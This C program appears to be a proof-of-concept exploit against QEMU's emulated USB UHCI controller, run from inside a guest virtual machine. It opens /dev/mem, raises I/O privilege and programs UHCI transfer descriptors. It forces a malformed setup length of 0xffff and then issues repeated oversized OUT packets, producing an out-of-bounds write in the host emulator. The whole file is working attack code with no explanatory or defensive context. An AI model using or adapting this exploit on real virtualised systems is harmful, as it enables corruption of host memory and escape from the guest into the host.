#include <assert.h>
#include <byteswap.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/mman.h>

void err(char *msg)
{
    perror(msg);
    exit(-1);
}

#define PAGE_SIZE getpagesize()
#define PFN_MASK_SIZE 8

uint64_t gva_to_gpa(uint64_t addr)
{
    int fd;
    if ((fd = open("/proc/self/pagemap", O_RDONLY)) == -1)
        err("open pagemap");
    lseek(fd, addr / PAGE_SIZE * sizeof(uint64_t), SEEK_SET);
    uint64_t page;
    read(fd, &page, PFN_MASK_SIZE);
    close(fd);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | (addr % PAGE_SIZE);
}

uint64_t readq(uint8_t *mem, uint32_t offset)
{
    return *((uint64_t *)&mem[offset]);
}

void writew(uint8_t *mem, uint32_t offset, uint16_t val)
{
    *((uint16_t *)&mem[offset]) = val;
}

void writel(uint8_t *mem, uint32_t offset, uint32_t val)
{
    *((uint32_t *)&mem[offset]) = val;
}

void writeq(uint8_t *mem, uint32_t offset, uint64_t val)
{
    *((uint64_t *)&mem[offset]) = val;
}

#define UHCI_PMIO_BASE 0xc140
#define UHCI_PMIO_SIZE 0x20

uint64_t preadl(uint64_t addr)
{
    return inl(UHCI_PMIO_BASE + addr);
}

void pwritel(uint64_t addr, uint32_t val)
{
    outl(val, UHCI_PMIO_BASE + addr);
}

// ----------------------------------------------------------------------------

#define UHCI_CMD_RS (1 << 0)
#define UHCI_PORT_EN (1 << 2)
#define UHCI_PORT_RESET (1 << 9)
#define TD_CTRL_ACTIVE (1 << 23)
#define USB_TOKEN_SETUP 0x2d
#define USB_TOKEN_IN 0x69
#define USB_TOKEN_OUT 0xe1
#define USB_DIR_OUT 0
#define USB_DIR_IN 0x80
#define SETUP_STATE_DATA 2
#define USB_TYPE_STANDARD (0x00 << 5)
#define USB_RECIP_DEVICE 0x00
#define DeviceRequest ((USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8)
#define USB_REQ_GET_DESCRIPTOR 0x06
#define USB_DT_DEVICE 0x01

typedef struct UHCI_TD
{
    uint32_t link;
    uint32_t ctrl;
    uint32_t token;
    uint32_t buffer;
} UHCI_TD;

// ----------------------------------------------------------------------------

#define UHCI_RW_CMD 0x0
#define UHCI_RW_STATUS 0x2
#define UHCI_RW_FRNUM 0x6
#define UHCI_RW_FL_BASE_ADDR 0x8
#define UHCI_RW_PORT 0x10

#define TD_OFFSET 0
#define SETUP_BUF_OFFSET 0x100

int fd;
uint8_t *buf, *st, *data_buf;
uint64_t buf_phys, st_phys, data_buf_phys;
uint32_t td_addr, setup_buf_addr;
UHCI_TD td;
uint8_t setup_buf[8];

void init()
{
    system("mknod -m 660 /dev/mem c 1 1");

    fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0)
        err("open /dev/mem");

    iopl(3);

    if ((buf = mmap(0, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED)
        err("mmap buf");
    mlock(buf, 3 * PAGE_SIZE);
    st = buf + PAGE_SIZE;
    data_buf = buf + 2 * PAGE_SIZE;
    buf_phys = gva_to_gpa(buf);
    st_phys = gva_to_gpa(st);
    data_buf_phys = gva_to_gpa(data_buf);

    td_addr = st_phys + TD_OFFSET;
    setup_buf_addr = st_phys + SETUP_BUF_OFFSET;

    for (int i = 0; i < 0x1000; i += sizeof(uint32_t))
        *(uint32_t *)(buf + i) = st_phys;

    td.ctrl = TD_CTRL_ACTIVE;
}

void work()
{
    memcpy(st + TD_OFFSET, &td, sizeof(UHCI_TD));
    memcpy(st + SETUP_BUF_OFFSET, &setup_buf, sizeof(setup_buf));

    // reset and enable port
    pwritel(UHCI_RW_PORT, UHCI_PORT_RESET | UHCI_PORT_EN);
    // set frame list addr
    pwritel(UHCI_RW_FL_BASE_ADDR, buf_phys);
    // begin processing
    pwritel(UHCI_RW_CMD, UHCI_CMD_RS);
    // wait a moment
    usleep(5000);
}

void setup(uint8_t request)
{
    // do_token_setup: s->setup_state = SETUP_STATE_DATA
    td.token = ((8 - 1) << 21) | USB_TOKEN_SETUP;
    td.buffer = setup_buf_addr;
    setup_buf[0] = request;
    writew(setup_buf, 6, 0x8);
    work();
    // do_token_setup: s->setup_len = 0xffff
    writew(setup_buf, 6, 0xffff);
    work();
}


void oob(uint8_t request, uint32_t len)
{
    // do_token_in or do_token_out: usb_packet_copy
    td.token = ((len - 1) << 21) | request;
    td.buffer = data_buf_phys;
    work();
}

int main()
{
    init();

    setup(USB_DIR_OUT);
    memset(data_buf, 0xde, 0x1000);
    for (int i = 0; i < 0x10; i++)
        oob(USB_TOKEN_OUT, 0x400);

    return 0;
}